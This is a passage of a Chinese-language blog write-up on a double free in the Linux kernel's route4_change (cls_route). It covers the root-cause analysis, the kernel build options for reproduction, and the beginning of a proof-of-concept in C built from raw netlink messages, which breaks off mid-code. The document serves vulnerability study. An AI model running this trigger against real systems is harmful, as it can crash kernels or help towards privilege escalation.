&#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (f)</span><br><span class="line">		tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>关键文件就是出在了<code>route4_change</code>中把旧的过滤器即<code>struct route4_filter</code>结构体从哈希桶中移出来，然后把他<code>kfree</code>掉，但是看关键代码,首先使用if判断这个这个<code>fold</code>是否存在以及他的<code>handle</code>是否存在，还要满足<code>f-&gt;handle != fold-&gt;handle</code>才进入循环里从哈希桶中脱链，如果条件不满足那就进入下一个判断，这个判断只是判断<code>fold</code>是否存在，如果存在的话就表示旧的过滤器存在，然后把他<code>kfree</code>掉。</p>
<p>可见由于脱链时判断旧过滤器是否存在和<code>kfree</code>时判断旧过滤器是否存在的判断依据不一样，这就会导致歧义的出现。假设这样一种情况，旧过滤器的<code>handle</code>为0，就会导致这个旧的过滤器不会被脱链但是会被kfree。这就可以造成doublefree.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h];</span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先是得把漏洞模块编译进入内核，其次还要勾上几个编译选项,这些编译选项最好不要直接在.config中进行修改，因为有些编译选项依赖于其他的编译选项，所以最好是在<code>make menuconfig</code>中进行修改，想要查找某一个编译选项在什么位置可以使用menuconifg的快捷键<code>/</code>进行搜索。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_BINFMT_MISC=y</span><br><span class="line">CONFIG_USER_NS=y</span><br><span class="line">CONFIG_NET_CLS_ROUTE4=y</span><br><span class="line">CONFIG_DUMMY=y CONFIG_NET_SCH_QFQ=y</span><br><span class="line">CONFIG_NET_CLS_ACT=y CONFIG_NET_CLS_BASIC=y</span><br><span class="line">CONFIG_NET_SCH_SFQ=y</span><br><span class="line">CONFIG_NET_EMATCH_META=y</span><br><span class="line">CONFIG_E1000=y CONFIG_E1000E=y</span><br></pre></td></tr></table></figure>

<h3 id="poc学习"><a href="#poc学习" class="headerlink" title="poc学习"></a>poc学习</h3><p>poc如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        dprintf(<span class="number">2</span>, <span class="string">&quot;%02X &quot;</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i];</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> || i + <span class="number">1</span> == size)</span><br><span class="line">        &#123;</span><br><span class="line">            dprintf(<span class="number">2</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dprintf(<span class="number">2</span>, <span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">1</span> == size)</span><br><span class="line">            &#123;</span><br><span class="line">                ascii[(i + <span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    dprintf(<span class="number">2</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i + <span class="number">1</span>) % <span class="number">16</span>; j &lt; <span class="number">16</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    dprintf(<span class="number">2</span>, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                dprintf(<span class="number">2</span>, <span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> newlink[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWLINK */</span></span><br><span class="line">        <span class="number">16</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_flags */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_change */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">16</span>, <span class="number">0x00</span>, <span class="number">18</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nested nla_len, nla_type */</span></span><br><span class="line">        <span class="number">10</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;y&#x27;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> dellink[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = DELLINK */</span></span><br><span class="line">        <span class="number">17</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_ifindex */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_flags */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_change */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> tfilter[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">68</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWTFILTER */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="comment">/* OPTIONS */</span></span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_TO */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_FROM */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ntfilter[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWTFILTER */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="comment">/* 0x200 = NLM_F_EXCL */</span></span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* OPTIONS */</span></span><br><span class="line">        <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_TO */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ROUTE4_FROM */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> linkcmd[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWQDISC */</span></span><br><span class="line">        <span class="number">36</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x05</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_handle */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* tcm_parent */</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">        <span class="comment">/* tcm_info = protocol/prio */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 